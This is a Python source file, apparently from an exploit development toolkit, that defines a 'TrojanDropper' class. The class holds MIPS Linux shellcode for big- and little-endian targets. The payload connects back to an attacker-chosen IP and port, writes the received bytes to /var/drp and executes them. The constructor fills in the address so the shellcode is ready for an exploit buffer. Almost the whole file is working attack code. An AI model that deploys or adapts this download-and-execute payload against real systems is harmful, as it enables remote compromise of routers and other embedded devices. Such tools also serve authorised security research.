# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
#p.add_string('K'*4)
# - Tactical Network Solutions, LLC
#
# See LICENSE.txt for more details.
#
import string
import socket
import os
import signal
from ...common.support import BigEndian,LittleEndian


class TrojanDropper:
    """
    This is a MIPS Linux connect-back payload that downloads and execs() a file.

    It will establish a TCP connection to the specified port and address, read
    off the socket to a file called "/var/drp", then exec() that file.
    The file should be served as a raw stream of bytes.  When the server has
    sent the entire file, it should close the connection.

    This payload can be used with TrojanServer to serve files to the target.
    Further, stage2dropper.c (in contrib) may be a useful companion trojan.
    """
    shellcodes={}
    shellcodes[BigEndian] = string.join([
    		"\x3c\x0f\x2f\x76", # lui	t7,0x2f76   "/v"
    		"\x35\xef\x61\x72", # ori	t7,t7,0x6172 "ar"
            "\xaf\xaf\xff\xf4", # sw    t7,-12(sp)
            "\x3c\x0e\x2f\x64", # lui   t6,0x2f64    "/d"
            "\x35\xce\x72\x70", # ori   t6,t6,0x7270 "rp"
            "\xaf\xae\xff\xf8", # sw    t6,-8(sp)
            "\xaf\xa0\xff\xfc", # sw    zero,-4(sp)
            "\x27\xa4\xff\xf4", # addiu a0,sp,-12
            "\x24\x05\x01\x11", # li    a1,273
            "\x24\x06\x01\xff", # li    a2,511
            "\x24\x02\x0f\xa5", # li    v0,4005
            "\x01\x01\x01\x0c", # syscall   0x40404
            "\xaf\xa2\xff\xd4", # sw    v0,-44(sp)
            "\x24\x0f\xff\xfd", # li    t7,-3
            "\x01\xe0\x28\x27", # nor   a1,t7,zero
            "\xaf\xa5\xff\xe0", # sw    a1,-32(sp)
            "\x8f\xa4\xff\xe0", # lw    a0,-32(sp)
            "\x28\x06\xff\xff", # slti  a2,zero,-1
            "\x24\x02\x10\x57", # li    v0,4183
            "\x01\x01\x01\x0c", # syscall   0x40404
            "\xaf\xa2\xff\xff", # sw    v0,-1(sp)
            "\x8f\xa4\xff\xff", # lw    a0,-1(sp)
            "\x3c\x0ePORT1PORT2", # lui   t6,0x7a69
            "\x35\xcePORT1PORT2", # ori   t6,t6,0x7a69
            "\xaf\xae\xff\xe4", # sw    t6,-28(sp)
            "\x3c\x0dIP0IP1", # lui   t5,0xa0a
            "\x35\xadIP2IP3", # ori   t5,t5,0xa0a
            "\xaf\xad\xff\xe6", # sw    t5,-26(sp)
            "\x27\xa5\xff\xe2", # addiu a1,sp,-30
            "\x24\x0c\xff\xef", # li    t4,-17
            "\x01\x80\x30\x27", # nor   a2,t4,zero
            "\x24\x02\x10\x4a", # li    v0,4170
            "\x01\x01\x01\x0c", # syscall   0x40404
            "\x28\x06\xff\xff", # slti  a2,zero,-1
            "\x8f\xa4\xff\xd4", # lw    a0,-44(sp)
            "\x27\xa5\xff\xd0", # addiu a1,sp,-48
            "\x24\x02\x0f\xa4", # li    v0,4004
            "\x01\x01\x01\x0c", # syscall   0x40404
            "\x8f\xa4\xff\xff", # lw    a0,-1(sp)
            "\x27\xa5\xff\xd0", # addiu a1,sp,-48
            "\x28\x06\x0f\xff", # slti  a2,zero,4095
            "\x24\x02\x0f\xa3", # li    v0,4003
            "\x01\x01\x01\x0c", # syscall   0x40404
            "\x1c\x40\xff\xf6", # bgtz  v0,88 <write_file>
            "\x24\x02\x0f\xa6", # li    v0,4006
            "\x01\x01\x01\x0c", # syscall   0x40404
            "\x8f\xa4\xff\xd4", # lw    a0,-44(sp)
            "\x24\x02\x0f\xa6", # li    v0,4006
            "\x01\x01\x01\x0c", # syscall   0x40404
            "\x27\xa4\xff\xf4", # addiu a0,sp,-12
            "\xaf\xa4\xff\xd0", # sw    a0,-48(sp)
            "\xaf\xa2\xff\xd4", # sw    v0,-44(sp)
            "\x28\x06\xff\xff", # slti  a2,zero,-1
            "\x24\x02\x0f\xab", # li    v0,4011
            "\x01\x01\x01\x0c", # syscall   0x40404
    ], '')

    shellcodes[LittleEndian] = string.join([
        "\x61\x72\x0f\x3c", # lui   t7,0x7261    "ra"
        "\x2f\x76\xef\x35", # ori   t7,t7,0x762f "v/"
        "\xf4\xff\xaf\xaf", # sw	t7,-12(sp)
        "\x72\x70\x0e\x3c", # lui	t6,0x7072    "pr"
        "\x2f\x64\xce\x35", # ori	t6,t6,0x642f "d/"
        "\xf8\xff\xae\xaf", # sw	t6,-8(sp)
        "\xfc\xff\xa0\xaf", # sw	zero,-4(sp)
        "\xf4\xff\xa4\x27", # addiu	a0,sp,-12
        "\x11\x01\x05\x24", # li	a1,273
        "\xff\x01\x06\x24", # li	a2,511
        "\xa5\x0f\x02\x24", # li	v0,4005
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xd4\xff\xa2\xaf", # sw	v0,-44(sp)
        "\xfd\xff\x0f\x24", # li	t7,-3
        "\x27\x28\xe0\x01", # nor	a1,t7,zero
        "\xe2\xff\xa5\xaf", # sw	a1,-30(sp)
        "\xe2\xff\xa4\x8f", # lw	a0,-30(sp)
        "\xff\xff\x06\x28", # slti	a2,zero,-1
        "\x57\x10\x02\x24", # li	v0,4183
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xff\xff\xa2\xaf", # sw	v0,-1(sp)
        "\xff\xff\xa4\x8f", # lw	a0,-1(sp)
        "\xe2\xff\xa5\xaf", # sw	a1,-30(sp)
        "PORT1PORT2\x0e\x3c", # lui	t6,0x901f port 8080
        "PORT1PORT2\xce\x35", # ori	t6,t6,0x901f port 8080
        "\xe4\xff\xae\xaf", # sw	t6,-28(sp)
        "IP2IP3\x0d\x3c", # lui	t5,<ip high>
        "IP0IP1\xad\x35", # ori	t5,t5,<ip low>
        "\xe6\xff\xad\xaf", # sw	t5,-26(sp)
        "\xe2\xff\xa5\x27", # addiu	a1,sp,-30
        "\xef\xff\x0c\x24", # li	t4,-17
        "\x27\x30\x80\x01", # nor	a2,t4,zero
        "\x4a\x10\x02\x24", # li	v0,4170
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xff\xff\x06\x28", # slti	a2,zero,-1
        "\xd4\xff\xa4\x8f", # lw	a0,-44(sp)
        "\xd0\xff\xa5\x27", # addiu	a1,sp,-48
        "\xa4\x0f\x02\x24", # li	v0,4004
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xff\xff\xa4\x8f", # lw	a0,-1(sp)
        "\xd0\xff\xa5\x27", # addiu	a1,sp,-48
        "\xff\x0f\x06\x28", # slti	a2,zero,4095
        "\xa3\x0f\x02\x24", # li	v0,4003
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xf6\xff\x40\x1c", # bgtz	v0,88 <write_file>
        "\xa6\x0f\x02\x24", # li	v0,4006
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xd4\xff\xa4\x8f", # lw	a0,-44(sp)
        "\xa6\x0f\x02\x24", # li	v0,4006
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xf4\xff\xa4\x27", # addiu	a0,sp,-12
        "\xd0\xff\xa4\xaf", # sw	a0,-48(sp)
        "\xd4\xff\xa2\xaf", # sw	v0,-44(sp)
        "\xff\xff\x06\x28", # slti	a2,zero,-1
        "\xab\x0f\x02\x24", # li	v0,4011
        "\x0c\x01\x01\x01"  # syscall	0x40404
    ],'')

    def __init__(self,connectback_ip,endianness,port=8080):
        """
        Class constructor.

        Parameters:
        -----------
        connectback_ip: IP Address to connect back to.
        endianness: Endianness of the target. one of LittleEndian or BigEndian,
                    (imported from bowcaster.common.support).
        port:   Optional parameter specifying TCP port to connect back to.
                Defaults to 8080.

        Attributes:
        -----------
        shellcode:  The string representing the payload's shellcode, ready to add
                    to an exploit buffer.

        Notes:
        ------
        Currently only LittleEndian is implemented.
        Although this payload is free of common bad characters such as nul bytes
        and spaces, your IP address or port may introduce bad characters.  If so,
        you may need to use an encoder.
        """
        self.endianness=endianness
        port=int(port)
        shellcode=self.__class__.shellcodes[endianness]
        i = 0
        for c in socket.inet_aton(connectback_ip):
            shellcode = shellcode.replace("IP%d" % i, c)
            i+=1
        shellcode=shellcode.replace("PORT1",chr(port >> 8))
        shellcode=shellcode.replace("PORT2",chr(port & 0xFF))
        self.shellcode=shellcode




